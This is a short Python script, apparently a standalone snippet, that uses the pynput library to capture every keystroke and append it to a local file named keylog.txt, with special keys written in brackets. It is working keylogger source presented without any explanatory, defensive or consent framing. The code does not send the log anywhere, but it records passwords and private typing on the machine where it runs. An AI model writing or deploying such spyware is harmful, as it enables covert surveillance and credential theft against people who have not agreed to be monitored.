from pynput import keyboard

# File to save keystrokes
log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # For special keys like space, enter, etc.
        with open(log_file, "a") as f:
            f.write(f" [{key}] ")

# Start listening
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
